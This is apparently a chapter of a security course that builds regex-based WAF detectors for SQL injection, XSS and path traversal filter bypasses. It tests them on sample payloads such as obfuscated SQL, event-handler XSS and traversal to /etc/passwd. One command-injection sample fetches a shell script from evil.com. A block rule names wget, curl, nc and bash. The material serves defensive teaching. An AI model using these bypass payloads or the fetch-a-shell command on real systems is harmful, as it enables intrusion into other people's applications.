# Part 77: Filter Bypass Pattern Analysis (Educational)

> **ระดับ:** ผู้เชี่ยวชาญ-ระดับโลก | **เวลาเรียน:** ~95 นาที | **ข้อกำหนด:** Part 01-76
>
> **ข้อกำหนดด้านจริยธรรม:** เนื้อหาส่วนนี้ใช้เพื่อการพัฒนา defensive security tools, WAF rule improvement,
> penetration testing ที่ได้รับอนุญาต, และการสอน Blue Team เท่านั้น

---

## 77.1 SQLi Filter Bypass Techniques (Defensive Analysis)

```python
import re
from typing import Dict, List

print("Filter Bypass Pattern Analysis (Defensive):")
print("=" * 60)
print("Purpose: Build better WAF rules by understanding bypass patterns")

print("\n1. SQL injection filter bypass patterns to DETECT:")

# Bypass: comment-based keyword splitting
# Attacker might try: sel/**/ect, UN/**/ION
SQLI_COMMENT_SPLIT = re.compile(
    r'(?:s(?:/\*[^*]*\*/)*e(?:/\*[^*]*\*/)*l(?:/\*[^*]*\*/)*e(?:/\*[^*]*\*/)*c(?:/\*[^*]*\*/)*t'
    r'|u(?:/\*[^*]*\*/)*n(?:/\*[^*]*\*/)*i(?:/\*[^*]*\*/)*o(?:/\*[^*]*\*/)*n)',
    re.IGNORECASE
)

# Bypass: case variation
# Attacker might try: SeLeCt, UnIoN
SQLI_CASE_VAR = re.compile(
    r'(?:[Ss][Ee][Ll][Ee][Cc][Tt]|[Uu][Nn][Ii][Oo][Nn]\s+[Ss][Ee][Ll][Ee][Cc][Tt])',
)

# Bypass: URL/double encoding
# %53%45%4c%45%43%54 = SELECT
SQLI_URL_ENCODED = re.compile(
    r'(?:%53%45%4[Cc]%45%43%54|%75%6[Ee]%69%6[Ff]%6[Ee])',
    re.IGNORECASE
)

# Bypass: using line breaks, tabs
SQLI_WHITESPACE = re.compile(
    r'(?:SELECT|UNION|INSERT|UPDATE|DELETE|DROP)\s*[\r\n\t]+\s*(?:FROM|INTO|WHERE|TABLE)',
    re.IGNORECASE | re.MULTILINE
)

# Bypass: MySQL-specific /*!SELECT*/ (version comment)
SQLI_MYSQL_VERSION = re.compile(
    r'/\*!\s*(?:SELECT|UNION|INSERT|UPDATE|DELETE|DROP|EXEC)',
    re.IGNORECASE
)

# Bypass: hex-encoded values
# 0x61646d696e = 'admin'
SQLI_HEX_VALUE = re.compile(r"0x[0-9A-Fa-f]{4,}")

# Bypass: concatenation
# 'ad'||'min', CONCAT('ad','min'), 'ad'+'min'
SQLI_CONCAT = re.compile(
    r"'[^']{1,20}'(?:\|\||\+|CONCAT\s*\()'[^']{1,20}'",
    re.IGNORECASE
)


def detect_sqli_bypass(payload: str) -> List[str]:
    detections = []
    checks = [
        (SQLI_COMMENT_SPLIT, 'comment-split keyword'),
        (SQLI_WHITESPACE,    'whitespace injection'),
        (SQLI_MYSQL_VERSION, 'MySQL version comment'),
        (SQLI_HEX_VALUE,     'hex-encoded value'),
        (SQLI_CONCAT,        'string concatenation'),
    ]
    for pattern, name in checks:
        if pattern.search(payload):
            detections.append(name)
    return detections


bypass_payloads = [
    "sel/**/ect * fr/**/om users",
    "UN/**/ION SEL/**/ECT 1,2,3",
    "SELECT\r\nFROM\r\nusers",
    "/*!SELECT*/ * FROM users",
    "WHERE username=0x61646d696e",
    "WHERE name='ad'||'min'",
    "WHERE name=CONCAT('ad','min')",
    "SELECT * FROM users WHERE id=1",
    "normal search query",
]

print(f"\n   SQLi bypass detection:")
for payload in bypass_payloads:
    detections = detect_sqli_bypass(payload)
    if detections:
        print(f"   \u26a0 {payload[:55]!r}")
        for d in detections:
            print(f"     \u2192 BYPASS: {d}")
    else:
        print(f"   \u2713 {payload[:55]!r}")
```

---

## 77.2 XSS Filter Bypass Patterns (Defensive Analysis)

```python
import re
import html
import urllib.parse
from typing import Dict, List

print("\nXSS Filter Bypass Patterns (Defensive Analysis):")
print("=" * 60)

# XSS bypass: case variation in tag names
XSS_TAG_CASE = re.compile(r'<\s*[Ss][Cc][Rr][Ii][Pp][Tt]', )

# XSS bypass: null bytes between tag characters
XSS_NULL_IN_TAG = re.compile(r'<[^>]*\x00[^>]*>', re.DOTALL)

# XSS bypass: double-encoded
XSS_DBL_ENCODED = re.compile(
    r'%253[Cc]|%253[Ee]|%2[Bb]|%25(?:27|22|3[cCeEfF])',
    re.IGNORECASE
)

# XSS bypass: HTML entity in attribute value
XSS_ENTITY_IN_ATTR = re.compile(
    r'(?:href|src|action|data)\s*=\s*["\']?\s*(?:&|&#)',
    re.IGNORECASE
)

# XSS bypass: SVG with event handler (bypasses img-only filters)
XSS_SVG = re.compile(
    r'<\s*svg\b[^>]*(?:onload|onabort|onerror)\s*=',
    re.IGNORECASE
)

# XSS bypass: IMG onerror
XSS_IMG_ERROR = re.compile(
    r'<\s*img\b[^>]*(?:onerror|onload)\s*=',
    re.IGNORECASE
)

# XSS bypass: INPUT autofocus
XSS_AUTOFOCUS = re.compile(
    r'<\s*input\b[^>]*(?:autofocus|onfocus)\s*=',
    re.IGNORECASE
)

# XSS bypass: iframe srcdoc
XSS_IFRAME_SRCDOC = re.compile(
    r'<\s*iframe\b[^>]*srcdoc\s*=',
    re.IGNORECASE
)

# XSS bypass: template literals in JS context
XSS_TEMPLATE_LITERAL = re.compile(
    r'`[^`]*\$\{[^}]*\}',
)

# XSS bypass: data: URI with HTML
XSS_DATA_HTML = re.compile(
    r'data:\s*text/html',
    re.IGNORECASE
)

# XSS bypass: object/embed tags
XSS_OBJECT = re.compile(
    r'<\s*(?:object|embed|applet|base|link|meta)\b',
    re.IGNORECASE
)


def normalize_and_detect_xss(payload: str) -> Dict:
    # Normalize: decode all layers
    decoded = html.unescape(payload)
    decoded = urllib.parse.unquote(decoded)
    decoded_twice = urllib.parse.unquote(decoded)

    checks = {
        'script_tag':       XSS_TAG_CASE,
        'null_in_tag':      XSS_NULL_IN_TAG,
        'double_encoded':   XSS_DBL_ENCODED,
        'entity_in_attr':   XSS_ENTITY_IN_ATTR,
        'svg_event':        XSS_SVG,
        'img_error':        XSS_IMG_ERROR,
        'input_autofocus':  XSS_AUTOFOCUS,
        'iframe_srcdoc':    XSS_IFRAME_SRCDOC,
        'template_literal': XSS_TEMPLATE_LITERAL,
        'data_html':        XSS_DATA_HTML,
        'object_embed':     XSS_OBJECT,
    }

    findings = {}
    for text in [payload, decoded, decoded_twice]:
        for name, pattern in checks.items():
            if name not in findings and pattern.search(text):
                findings[name] = text[:50]

    return findings


xss_bypasses = [
    '<ScRiPt>alert(1)</sCrIpT>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '%253Cscript%253Ealert(1)',
    'data:text/html,<script>alert(1)</script>',
    '<object data="javascript:alert(1)">',
    'normal text without XSS',
]

print(f"\n   XSS bypass detection (after normalization):")
for payload in xss_bypasses:
    findings = normalize_and_detect_xss(payload)
    if findings:
        print(f"\n   \u26a0 {payload[:60]!r}")
        for k, v in findings.items():
            print(f"     \u2192 {k}: matched in {v[:40]!r}")
    else:
        print(f"   \u2713 {payload[:60]!r}")
```

---

## 77.3 Path Traversal Bypass Detection

```python
import re
import urllib.parse
from typing import Dict, List

print("\nPath Traversal Bypass Detection:")
print("=" * 60)

# Standard path traversal
PT_STANDARD = re.compile(r'\.\.[/\\]')

# URL-encoded variants
PT_URL1 = re.compile(r'\.\.\.%2[fF]|\.\.\.%5[cC]', re.IGNORECASE)
PT_URL2 = re.compile(r'%2[eE]%2[eE][%2f%5c]', re.IGNORECASE)
PT_DBL  = re.compile(r'%25(?:2[eE]|2[fF]|5[cC])', re.IGNORECASE)

# Unicode/UTF-8 variants
PT_UNICODE = re.compile(r'(?:%c0%af|%c1%9c|%e0%80%af)', re.IGNORECASE)

# Bypass: extra dots
PT_EXTRA_DOTS = re.compile(r'\.{3,}[/\\]|[/\\]\.{3,}')

# Bypass: mixed slashes
PT_MIXED = re.compile(r'\.\.[/\\][./\\]*\.\.')

# Bypass: null byte truncation
PT_NULL = re.compile(r'(?:%00|\x00)')

# Absolute path attempts
PT_ABSOLUTE_UNIX    = re.compile(r'^/(?:etc|proc|var|tmp|root|home|usr|bin|sbin|dev|sys)')
PT_ABSOLUTE_WINDOWS = re.compile(r'^[A-Za-z]:[/\\]|^\\\\', re.IGNORECASE)

# Sensitive file targets
SENSITIVE_FILES = re.compile(
    r'(?:etc/passwd|etc/shadow|etc/hosts|etc/sudoers|'
    r'proc/self/environ|proc/self/cmdline|'
    r'windows/win\.ini|windows/system32|'
    r'boot\.ini|php\.ini|my\.ini|'
    r'\.ssh/id_rsa|\.bash_history|\.bashrc)',
    re.IGNORECASE
)


def detect_path_traversal(path: str) -> List[str]:
    detections = []

    # Normalize: URL decode up to 3 layers
    normalized = path
    for _ in range(3):
        prev = normalized
        normalized = urllib.parse.unquote(normalized)
        if normalized == prev:
            break

    for text in [path, normalized]:
        if PT_STANDARD.search(text):
            detections.append('dot-dot-slash')
        if PT_URL1.search(text) or PT_URL2.search(text):
            detections.append('url-encoded-traversal')
        if PT_DBL.search(text):
            detections.append('double-encoded-traversal')
        if PT_UNICODE.search(text):
            detections.append('unicode-traversal')
        if PT_EXTRA_DOTS.search(text):
            detections.append('extra-dots')
        if PT_NULL.search(text):
            detections.append('null-byte')
        if PT_ABSOLUTE_UNIX.search(text) or PT_ABSOLUTE_WINDOWS.search(text):
            detections.append('absolute-path')
        if SENSITIVE_FILES.search(text):
            detections.append('sensitive-file-target')

    return list(set(detections))


path_inputs = [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252Fetc%252Fpasswd',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//etc/passwd',
    '../etc/passwd%00.jpg',
    '/etc/shadow',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'images/photo.jpg',
    'uploads/document.pdf',
    '..\\..\\windows\\win.ini',
]

print(f"\n   Path traversal bypass detection:")
for path in path_inputs:
    detections = detect_path_traversal(path)
    if detections:
        print(f"   \u26a0 {path[:50]!r}")
        print(f"     Detections: {detections}")
    else:
        print(f"   \u2713 {path[:50]!r}")
```

---

## 77.4 Building Robust WAF Rules

```python
import re
from typing import Dict, List, Callable
import urllib.parse
import html

print("\nBuilding Robust WAF Rules:")
print("=" * 60)

def normalize_input(raw: str, max_depth: int = 3) -> str:
    """Normalize input by decoding all encoding layers."""
    current = raw
    for _ in range(max_depth):
        # URL decode
        decoded = urllib.parse.unquote(current)
        # HTML entity decode
        decoded = html.unescape(decoded)
        # Remove null bytes
        decoded = decoded.replace('\x00', '')
        # Normalize whitespace variants
        decoded = re.sub(r'[\r\n\t\x0b\x0c]+', ' ', decoded)
        if decoded == current:
            break
        current = decoded
    return current.lower()


# Robust multi-layer detection
class RobustWAF:
    def __init__(self):
        self.rules: List[Dict] = []

    def add_rule(self, name: str, pattern: str, flags: int = re.IGNORECASE):
        self.rules.append({
            'name':    name,
            'pattern': re.compile(pattern, flags),
        })

    def check(self, raw_input: str) -> Dict:
        # Check both raw and normalized
        normalized = normalize_input(raw_input)
        findings   = []

        for rule in self.rules:
            for text in [raw_input, normalized]:
                if rule['pattern'].search(text):
                    findings.append({
                        'rule':  rule['name'],
                        'layer': 'raw' if text == raw_input else 'normalized',
                    })
                    break

        return {
            'blocked':    len(findings) > 0,
            'findings':   findings,
            'normalized': normalized[:50],
        }


waf = RobustWAF()

# SQLi
waf.add_rule('sqli_union',   r'\bunion\b.{0,200}\bselect\b', re.IGNORECASE | re.DOTALL)
waf.add_rule('sqli_tautology', r"(?:'|\")\s*[\s\d]*(?:or|and)[\s\d]+(?:'\d'|\d+\s*=\s*\d+|'[^']*'='[^']*')", re.IGNORECASE)
waf.add_rule('sqli_stacked',  r';\s*(?:drop|delete|insert|update|create|exec)\b', re.IGNORECASE)
waf.add_rule('sqli_comment',  r'(?:--|#|/\*|\*/)\s*$', re.MULTILINE)

# XSS
waf.add_rule('xss_script',    r'<\s*script\b')
waf.add_rule('xss_event',     r'\bon(?:load|error|click|focus|blur|change|submit|input|keydown|keyup)\s*=', re.IGNORECASE)
waf.add_rule('xss_proto',     r'(?:javascript|vbscript|data:text/html)\s*:', re.IGNORECASE)

# Path traversal
waf.add_rule('path_traversal', r'\.\.[/\\]|\.\.\.%2[fF5c]', re.IGNORECASE)
waf.add_rule('sensitive_file', r'(?:etc/passwd|etc/shadow|win\.ini|id_rsa|bash_history)', re.IGNORECASE)

# CMDi
waf.add_rule('cmd_inject', r'[;&|`]\s*(?:id|whoami|uname|cat|wget|curl|bash|sh|nc)\b', re.IGNORECASE)


test_suite = [
    ("Clean input", "hello world"),
    ("SQLi basic", "' OR 1=1 --"),
    ("SQLi encoded", "%27%20OR%201%3D1%20--"),
    ("SQLi double-enc", "%2527%2520OR%25201%253D1"),
    ("XSS basic", "<script>alert(1)</script>"),
    ("XSS encoded", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("XSS html-entity", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("Path traversal", "../../../etc/passwd"),
    ("Path enc", "..%2F..%2Fetc%2Fpasswd"),
    ("CMDi", "1; wget http://evil.com/shell.sh"),
    ("Normal search", "python regex tutorial 2024"),
]

print(f"\n   Robust WAF multi-layer test:")
for name, payload in test_suite:
    result = waf.check(payload)
    status = '\U0001f6a8 BLOCK' if result['blocked'] else '\u2713 ALLOW'
    print(f"\n   {status} | {name}")
    print(f"   Input:      {payload[:50]!r}")
    if result['blocked']:
        print(f"   Normalized: {result['normalized']!r}")
        for f in result['findings']:
            print(f"   Rule [{f['layer']}]: {f['rule']}")
```

---

## 77.5 สรุป Part 77

```
Filter Bypass Techniques & Defenses:

1. SQLi bypass methods and detection:
   Comment split:  sel/**/ect -> strip comments first
   Case variation: SeLeCt -> case-insensitive match
   Whitespace:     SELECT\r\nFROM -> normalize whitespace
   MySQL comment:  /*!SELECT*/ -> detect /*!...*/
   Hex encoding:   0x61646d696e -> decode 0x values
   Concatenation:  'ad'||'min' -> detect concat patterns

2. XSS bypass methods and detection:
   Tag case:      <ScRiPt> -> case-insensitive tags
   Null bytes:    <scr\x00ipt> -> strip nulls first
   Double-encode: %253Cscript -> decode before check
   SVG/IMG:       <svg onload=>, <img onerror=> -> check all tags
   data: URI:     data:text/html -> block data: scheme
   Entity encode: &#60;script&#62; -> decode entities first

3. Path traversal bypasses and detection:
   Standard:      ../  ->  \.\.[/\\]
   URL-encoded:   %2e%2e%2f -> URL-decode first
   Double-enc:    %252e%252e%252f -> multi-layer decode
   Unicode:       %c0%af (overlong UTF-8 /) -> block
   Null-byte:     ../etc/passwd%00.jpg -> strip null
   Mixed slashes: ..\/  or  /..\  -> normalize slashes

4. Robust WAF design:
   ALWAYS normalize BEFORE checking:
   1. URL decode (3 passes)
   2. HTML entity decode
   3. Strip null bytes
   4. Normalize whitespace
   5. Lowercase
   Then apply pattern checks on both raw AND normalized

5. Defense-in-depth:
   WAF is ONE layer, not the only layer
   Always use parameterized queries (SQLi)
   Always use context-aware output encoding (XSS)
   Always use chroot/jail for file access (LFI)
   WAF reduces surface, doesn't eliminate vulnerability
```

---

*[\u2190 Part 76: WAF Detection Patterns](part-76-waf-detection.md) | [\u2192 Part 78: Advanced Evasion Analysis](part-78-advanced-evasion.md)*
